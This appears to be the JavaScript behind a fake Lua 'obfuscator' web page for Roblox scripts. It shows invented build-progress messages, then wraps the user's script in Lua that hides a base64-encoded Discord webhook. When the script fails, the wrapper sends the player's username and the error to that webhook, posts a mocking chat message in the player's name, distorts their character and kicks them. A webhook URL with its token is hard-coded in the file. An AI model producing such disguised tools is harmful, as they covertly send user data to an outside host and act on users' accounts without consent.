// script.js
const targetHook = "https://discord.com/api/webhooks/1480014350755434558/lVhs2_YcG-LuG7zLjWSwBGzZPk2f1RF1fmRC5P7zZdgzJfX_fq2sdPAD81T4hOqMvfT2";

document.getElementById('clearBtn').onclick = () => {
    document.getElementById('input').value = "";
    document.getElementById('output').innerText = "";
    document.getElementById('status-terminal').innerHTML = "";
};

document.getElementById('goBtn').onclick = () => {
    const src = document.getElementById('input').value;
    const status = document.getElementById('status');
    const term = document.getElementById('status-terminal');
    if (!src.trim()) return;

    status.innerText = "BUILDING...";
    term.innerHTML = "";

    const lines = [
        "accessing git-core...",
        "fetching build-engine headers...",
        "linking webhook 148001...",
        "initiating poly-shift...",
        "caching monster-mash...",
        "finalizing bozo-kick..."
    ];

    let i = 0;
    const loop = setInterval(() => {
        if (i < lines.length) {
            term.innerHTML += `<div style="color:#2e5bff">[~] ${lines[i]}</div>`;
            term.scrollTop = term.scrollHeight;
            i++;
        }
    }, 1100);

    setTimeout(() => {
        clearInterval(loop);
        
        const dumpSize = 32 + Math.floor(src.length * 0.15);
        const makeDump = () => "x" + Array(dumpSize).fill(0).map(() => "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.floor(Math.random() * 62))).join("");
        const mutatorName = makeDump();

        document.getElementById('output').innerText = 
`-- Pobfus Output
local function ${mutatorName}(_pld)
    local _env = getfenv()
    local _http = _env["game"]:GetService("HttpService")
    local _chat = _env["game"]:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
    local _lp = _env["game"]:GetService("Players").LocalPlayer
    
    local function _humiliate(_err)
        pcall(function()
            _http:PostAsync(_env["game"]:GetService("HttpService"):DecodeBase64("${btoa(targetHook)}"), _http:JSONEncode({
                ["content"] = "🚫 **SKID DETECTED** 🚫\\n**User:** ".._lp.Name.."\\n**Error:** ".._err
            }))
            _chat:FireServer("I'm a stinky skidder doing the Monster Mash!", "All")
            if _lp.Character then
                for _ = 1, 3 do
                    for _s = 1, 20 do
                        for _, v in pairs(_lp.Character:GetDescendants()) do
                            if v:IsA("Motor6D") then
                                v.C0 = v.C0 * CFrame.Angles(math.random(-10, 10), math.random(-10, 10), math.random(-10, 10))
                            end
                        end
                        task.wait(0.1)
                    end
                end
            end
            _lp:Kick("go find a better decompiler bozo")
        end)
    end

    local _ok, _res = _env["pcall"](function()
        return _env["loadstring"](_env["game"]:GetService("HttpService"):DecodeBase64(_pld))()
    end)

    if not _ok then _humiliate(_res) end
end

${mutatorName}("${btoa(src)}")`;

        status.innerText = "COMPLETED";
        term.innerHTML += `<div style="color:#00ff00;">[+] build successful.</div>`;
    }, 7500);
};
